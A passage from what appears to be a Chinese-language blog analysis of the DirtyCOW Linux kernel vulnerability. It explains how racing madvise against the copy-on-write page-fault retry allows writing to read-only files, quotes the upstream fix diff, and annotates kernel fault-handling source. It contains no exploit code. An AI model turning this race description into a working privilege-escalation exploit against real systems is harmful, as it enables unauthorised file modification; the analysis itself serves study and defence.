<li><code>faultin_page</code>将页面读入内存，建好映射，返回后 retry</li>
</ol>
</li>
<li>第二次
<ol>
<li><code>follow_page_mask</code>第二次获取页面，获取的操作包含了写页面，而目标页面是只读的，获取失败造成第二次缺页异常</li>
<li><code>faultin_page</code>根据 COW 机制，拷贝出一份匿名页面，重建映射，并消除掉<code>FOLL_WRITE</code>标志避免无穷尽地 retry，最后返回 retry</li>
</ol>
</li>
<li>第三次
<ol>
<li><code>follow_page_mask</code>第三次获取页面，这次它的写标志被消除掉了，所以这次以只读的权限成功获取到 COW 拷贝出的匿名页面，没有再引发异常</li>
<li>返回到<code>kmap</code>，进程完成写入（但更改不会被同步到文件中）</li>
</ol>
</li>
</ol>
<h5 id="how-does-dirtycow-run">How does DirtyCOW run</h5>
<p>到了这里其实漏洞点已经比较明确了，三次缺页处理的<code>retry</code>部分本应是原子的，至少应该给 pte 加锁，但实际上这里不知是出于何种考虑这里并没有进行保护，导致这段执行流很容易被破坏。DirtyCOW 就是在完成上面的流程同时不断调用<code>madvice</code>尝试让内核清零 pte 以解除目标页面的映射，最终导致以下执行流</p>
<ol>
<li>第一次
<ol>
<li>Task 第一次访问<code>mmap</code>将文件映射进的地址，由于<code>mmap</code>不会将页面读进内存，<code>follow_page_mask</code>获取页面失败造成第一次缺页异常</li>
<li><code>faultin_page</code>将页面读入内存，建好映射，返回后 retry</li>
</ol>
</li>
<li>第二次
<ol>
<li><code>follow_page_mask</code>第二次获取页面，获取的操作包含了写页面，而目标页面是只读的，获取失败造成第二次缺页异常</li>
<li><code>faultin_page</code>根据 COW 机制，拷贝出一份匿名页面，重建映射，并消除掉<code>FOLL_WRITE</code>标志避免无穷尽地 retry，最后返回 retry</li>
</ol>
</li>
<li>竞争：此时内核在<code>madvice</code>的建议下清空虚拟地址所在的 pte 解除了虚拟地址映射（同进程下的线程之间共享同一份页表）</li>
<li>第三次
<ol>
<li><code>follow_page_mask</code>第三次获取页面，这次它的写标志被消除掉了，所以这次以只读的权限尝试获取，同时页面被解除了映射，又引发缺页异常</li>
<li>因为这次权限是只读，所以<code>faultin_page</code>成功将目标页面读入内存并建立了映射，而非像正常情况一样 COW 拷贝出一份匿名页面，返回 retry</li>
</ol>
</li>
<li>第四次
<ol>
<li><code>follow_page_mask</code>第四次获取页面，这次成功获取到目标页面，没有再引发异常</li>
<li>返回到<code>kmap</code>，进程完成写入，页面置脏位，最终更改表内同步到文件中，完成越权写入</li>
</ol>
</li>
</ol>
<p>剩下一个可能会感到疑惑的点是，就算我们拿到了页面，但原来的 vma 还是只读的，最后也没法完成写入。这个问题的解决根本似乎是<code>kmap</code>会把内存映射进内核的 high memory，即使用户态 vma 映射的 pte 是只读的，但内核态的 high memory 映射的 pte 却有写权限，借由它我们可以顺利完成越权写入，这也是<code>mem_write</code>特有的特性</p>
<h5 id="to-be-a-good-cow">To be a good COW</h5>
<p>最后看看 Linus 的 patch，可能是出于性能考虑，他并未在漏洞点进行加锁，而是重新设置了一个<code>FOLL_COW</code>标签来对 COW 进行特殊处理</p>
<ul>
<li>commit：<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619">mm: remove gup_flags FOLL_WRITE games from __get_user_pages()</a></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git a/include/linux/mm.h b/include/linux/mm.h
</span></span></span><span class="line"><span class="cl"><span class="gh">index e9caec6a51e97a..ed85879f47f5f7 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/include/linux/mm.h
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/include/linux/mm.h
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -2232,6 +2232,7 @@ static inline struct page *follow_page(struct vm_area_struct *vma,
</span></span></span><span class="line"><span class="cl"><span class="gu"></span> #define FOLL_TRIED	0x800	/* a retry, previous pass started an IO */
</span></span><span class="line"><span class="cl"> #define FOLL_MLOCK	0x1000	/* lock present pages */
</span></span><span class="line"><span class="cl"> #define FOLL_REMOTE	0x2000	/* we are working on non-current tsk/mm */
</span></span><span class="line"><span class="cl"><span class="gi">+#define FOLL_COW	0x4000	/* internal GUP flag */
</span></span></span><span class="line"><span class="cl"><span class="gi"></span> 
</span></span><span class="line"><span class="cl"> typedef int (*pte_fn_t)(pte_t *pte, pgtable_t token, unsigned long addr,
</span></span><span class="line"><span class="cl"> 			void *data);
</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/mm/gup.c b/mm/gup.c
</span></span></span><span class="line"><span class="cl"><span class="gh">index 96b2b2fd0fbd13..22cc22e7432f60 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/mm/gup.c
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/mm/gup.c
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -60,6 +60,16 @@ static int follow_pfn_pte(struct vm_area_struct *vma, unsigned long address,
</span></span></span><span class="line"><span class="cl"><span class="gu"></span> 	return -EEXIST;
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="gi">+/*
</span></span></span><span class="line"><span class="cl"><span class="gi">+ * FOLL_FORCE can write to even unwritable pte&#39;s, but only
</span></span></span><span class="line"><span class="cl"><span class="gi">+ * after we&#39;ve gone through a COW cycle and they are dirty.
</span></span></span><span class="line"><span class="cl"><span class="gi">+ */
</span></span></span><span class="line"><span class="cl"><span class="gi">+static inline bool can_follow_write_pte(pte_t pte, unsigned int flags)
</span></span></span><span class="line"><span class="cl"><span class="gi">+{
</span></span></span><span class="line"><span class="cl"><span class="gi">+	return pte_write(pte) ||
</span></span></span><span class="line"><span class="cl"><span class="gi">+		((flags &amp; FOLL_FORCE) &amp;&amp; (flags &amp; FOLL_COW) &amp;&amp; pte_dirty(pte));
</span></span></span><span class="line"><span class="cl"><span class="gi">+}
</span></span></span><span class="line"><span class="cl"><span class="gi">+
</span></span></span><span class="line"><span class="cl"><span class="gi"></span> static struct page *follow_page_pte(struct vm_area_struct *vma,
</span></span><span class="line"><span class="cl"> 		unsigned long address, pmd_t *pmd, unsigned int flags)
</span></span><span class="line"><span class="cl"> {
</span></span><span class="line"><span class="cl"><span class="gu">@@ -95,7 +105,7 @@ retry:
</span></span></span><span class="line"><span class="cl"><span class="gu"></span> 	}
</span></span><span class="line"><span class="cl"> 	if ((flags &amp; FOLL_NUMA) &amp;&amp; pte_protnone(pte))
</span></span><span class="line"><span class="cl"> 		goto no_page;
</span></span><span class="line"><span class="cl"><span class="gd">-	if ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) {
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+	if ((flags &amp; FOLL_WRITE) &amp;&amp; !can_follow_write_pte(pte, flags)) {
</span></span></span><span class="line"><span class="cl"><span class="gi"></span> 		pte_unmap_unlock(ptep, ptl);
</span></span><span class="line"><span class="cl"> 		return NULL;
</span></span><span class="line"><span class="cl"> 	}
</span></span><span class="line"><span class="cl"><span class="gu">@@ -412,7 +422,7 @@ static int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,
</span></span></span><span class="line"><span class="cl"><span class="gu"></span> 	 * reCOWed by userspace write).
</span></span><span class="line"><span class="cl"> 	 */
</span></span><span class="line"><span class="cl"> 	if ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))
</span></span><span class="line"><span class="cl"><span class="gd">-		*flags &amp;= ~FOLL_WRITE;
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+	        *flags |= FOLL_COW;
</span></span></span><span class="line"><span class="cl"><span class="gi"></span> 	return 0;
</span></span><span class="line"><span class="cl"> }
</span></span></code></pre></div><h4 id="dive-into-page-fault">Dive into Page Fault</h4>
<h5 id="handle_mm_fault">handle_mm_fault</h5>
<p>前面我们在<code>faultin_page</code>停下了，现在我们继续从<code>handle_mm_fault</code>开始继续深入</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">handle_mm_fault</span><span class="p">(</span><span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">,</span> <span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">__set_current_state</span><span class="p">(</span><span class="n">TASK_RUNNING</span><span class="p">);</span>	<span class="c1">// 在处理完缺页异常后进程需要继续运行，保持TASK_RUNNING状态
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="nf">count_vm_event</span><span class="p">(</span><span class="n">PGFAULT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">mem_cgroup_count_vm_event</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">PGFAULT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* do counter updates before entering really critical section. */</span>
</span></span><span class="line"><span class="cl">	<span class="nf">check_sync_rss_stat</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * Enable the memcg OOM handling for faults triggered in user
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * space.  Kernel faults are handled more gracefully.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FAULT_FLAG_USER</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="nf">mem_cgroup_oom_enable</span><span class="p">();</span>	<span class="c1">// 使能内存控制组的OOM处理
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="nf">__handle_mm_fault</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>	<span class="c1">// handle的真正入口
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FAULT_FLAG_USER</span><span class="p">)</span> <span class="p">{</span>	<span class="c1">// 如果是用户态的缺页异常
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nf">mem_cgroup_oom_disable</span><span class="p">();</span>	<span class="c1">// 禁用内存控制组的OOM处理
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">                 * The task may have entered a memcg OOM situation but
</span></span></span><span class="line"><span class="cl"><span class="cm">                 * if the allocation error was handled gracefully (no
</span></span></span><span class="line"><span class="cl"><span class="cm">                 * VM_FAULT_OOM), there is no need to kill anything.
</span></span></span><span class="line"><span class="cl"><span class="cm">                 * Just clean up the OOM state peacefully.
</span></span></span><span class="line"><span class="cl"><span class="cm">                 */</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nf">task_in_memcg_oom</span><span class="p">(</span><span class="n">current</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_OOM</span><span class="p">))</span>	<span class="c1">// 如果进程处于内存控制组的OOM状态，但没有OOM错误
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="nf">mem_cgroup_oom_synchronize</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>	<span class="c1">// 清理OOM状态即可
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">EXPORT_SYMBOL_GPL</span><span class="p">(</span><span class="n">handle_mm_fault</span><span class="p">);</span>
</span></span></code></pre></div><h5 id="__handle_mm_fault">__handle_mm_fault</h5>
<p>再看到 wrap 的<code>__handle_mm_fault</code>，其实就是解析出目标所在的 pte，然后调用<code>handle_pte_fault</code>处理</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">__handle_mm_fault</span><span class="p">(</span><span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">,</span> <span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			     <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">pgd_t</span> <span class="o">*</span><span class="n">pgd</span><span class="p">;</span>	<span class="c1">// 页全局目录指针
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kt">pud_t</span> <span class="o">*</span><span class="n">pud</span><span class="p">;</span>	<span class="c1">// 页上级目录指针
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kt">pmd_t</span> <span class="o">*</span><span class="n">pmd</span><span class="p">;</span>	<span class="c1">// 页中间目录指针
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kt">pte_t</span> <span class="o">*</span><span class="n">pte</span><span class="p">;</span>	<span class="c1">// 页表项指针
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="nf">is_vm_hugetlb_page</span><span class="p">(</span><span class="n">vma</span><span class="p">)))</span>	<span class="c1">// hugepage
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">return</span> <span class="nf">hugetlb_fault</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">pgd</span> <span class="o">=</span> <span class="nf">pgd_offset</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>		<span class="c1">// (mm)-&gt;pgd + (address)&gt;&gt;PGDIR_SHIFT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">pud</span> <span class="o">=</span> <span class="nf">pud_alloc</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">pgd</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>	<span class="c1">// 获取pud指针
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pud</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">VM_FAULT_OOM</span><span class="p">;</span>	<span class="c1">// out of memory
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">pmd</span> <span class="o">=</span> <span class="nf">pmd_alloc</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">pud</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>	<span class="c1">// 获取pmd指针
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pmd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">VM_FAULT_OOM</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">pmd_none</span><span class="p">(</span><span class="o">*</span><span class="n">pmd</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nf">transparent_hugepage_enabled</span><span class="p">(</span><span class="n">vma</span><span class="p">))</span> <span class="p">{</span>	<span class="c1">// 透明大页
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">create_huge_pmd</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_FALLBACK</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kt">pmd_t</span> <span class="n">orig_pmd</span> <span class="o">=</span> <span class="o">*</span><span class="n">pmd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nf">barrier</span><span class="p">();</span>	<span class="c1">// 内存屏障，确保orig_pmd的读取顺序不会被编译器优化，保证读取的是最新的pmd值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="nf">pmd_trans_huge</span><span class="p">(</span><span class="n">orig_pmd</span><span class="p">))</span> <span class="p">{</span>		<span class="c1">// 透明大页
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">dirty</span> <span class="o">=</span> <span class="n">flags</span> <span class="o">&amp;</span> <span class="n">FAULT_FLAG_WRITE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * If the pmd is splitting, return and retry the
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * the fault.  Alternative: wait until the split
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * is done, and goto retry.
</span></span></span><span class="line"><span class="cl"><span class="cm">			 */</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="nf">pmd_trans_splitting</span><span class="p">(</span><span class="n">orig_pmd</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="nf">pmd_protnone</span><span class="p">(</span><span class="n">orig_pmd</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="nf">do_huge_pmd_numa_page</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">							     <span class="n">orig_pmd</span><span class="p">,</span> <span class="n">pmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">dirty</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">pmd_write</span><span class="p">(</span><span class="n">orig_pmd</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="n">ret</span> <span class="o">=</span> <span class="nf">wp_huge_pmd</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">							<span class="n">orig_pmd</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">ret</span> <span class="o">&amp;</span> <span class="n">VM_FAULT_FALLBACK</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">					<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nf">huge_pmd_set_accessed</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">						      <span class="n">orig_pmd</span><span class="p">,</span> <span class="n">dirty</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * Use __pte_alloc instead of pte_alloc_map, because we can&#39;t
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * run pte_offset_map on the pmd, if an huge pmd could
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * materialize from under us from a different thread.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="nf">pmd_none</span><span class="p">(</span><span class="o">*</span><span class="n">pmd</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">	    <span class="nf">unlikely</span><span class="p">(</span><span class="nf">__pte_alloc</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span> <span class="n">address</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">VM_FAULT_OOM</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * If a huge pmd materialized under us just retry later.  Use
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * pmd_trans_unstable() instead of pmd_trans_huge() to ensure the pmd
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * didn&#39;t become pmd_trans_huge under us and then back to pmd_none, as
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * a result of MADV_DONTNEED running immediately after a huge pmd fault
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * in a different thread of this mm, in turn leading to a misleading
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * pmd_trans_huge() retval.  All we have to ensure is that it is a
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * regular pmd that we can walk with pte_offset_map() and we can do that
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * through an atomic read in C, which is what pmd_trans_unstable()
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * provides.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="nf">pmd_trans_unstable</span><span class="p">(</span><span class="n">pmd</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * A regular pmd is established and it can&#39;t morph into a huge pmd
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * from under us anymore at this point because we hold the mmap_sem
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * read mode and khugepaged takes it in write mode. So now it&#39;s
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * safe to run pte_offset_map().
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="n">pte</span> <span class="o">=</span> <span class="nf">pte_offset_map</span><span class="p">(</span><span class="n">pmd</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>		<span class="c1">// 获取pte指针，这也是这个wrap的最终的目标
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nf">handle_pte_fault</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">pte</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>		<span class="c1">// 进入page fault处理
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><h5 id="handle_pte_fault">handle_pte_fault</h5>
<p><code>handle_pte_fault</code>流程如下，关键函数是<code>do_fault</code>和<code>do_wp_page</code></p>
<ul>
<li>首先判断 pte 是否为空，是则表明进程是第一次访问该页面
<ul>
<li>若访问的是匿名页面则调用<code>do_anonymous_page</code></li>
<li>若访问的是非匿名页面则调用<code>do_fault</code></li>
<li>做完这些直接返回</li>
</ul>
</li>
<li>若在内存中（表明此前已经访问过页面），那么做完一些检查后，若 page fault 是由写操作引发的
<ul>
<li>若没有写权限，就调用<code>do_wp_page</code></li>
<li>若有写权限，那就给 pte 置脏位</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">handle_pte_fault</span><span class="p">(</span><span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		     <span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		     <span class="kt">pte_t</span> <span class="o">*</span><span class="n">pte</span><span class="p">,</span> <span class="kt">pmd_t</span> <span class="o">*</span><span class="n">pmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">pte_t</span> <span class="n">entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">spinlock_t</span> <span class="o">*</span><span class="n">ptl</span><span class="p">;</span>	<span class="c1">// 页表自旋锁
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * some architectures can have larger ptes than wordsize,
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * The code below just needs a consistent view for the ifs and
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * we later double check anyway with the ptl lock held. So here
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * a barrier will do.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="n">entry</span> <span class="o">=</span> <span class="o">*</span><span class="n">pte</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nf">barrier</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">pte_present</span><span class="p">(</span><span class="n">entry</span><span class="p">))</span> <span class="p">{</span>	<span class="c1">// 页表项不在内存中（page fault第一次）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="nf">pte_none</span><span class="p">(</span><span class="n">entry</span><span class="p">))</span> <span class="p">{</span>	<span class="c1">// 页表项为空，进程第一次访问该页面
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="k">if</span> <span class="p">(</span><span class="nf">vma_is_anonymous</span><span class="p">(</span><span class="n">vma</span><span class="p">))</span>	<span class="c1">// 没有设置vma-&gt;vm_ops，即为匿名页面（即不是文件映射）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="k">return</span> <span class="nf">do_anonymous_page</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span>
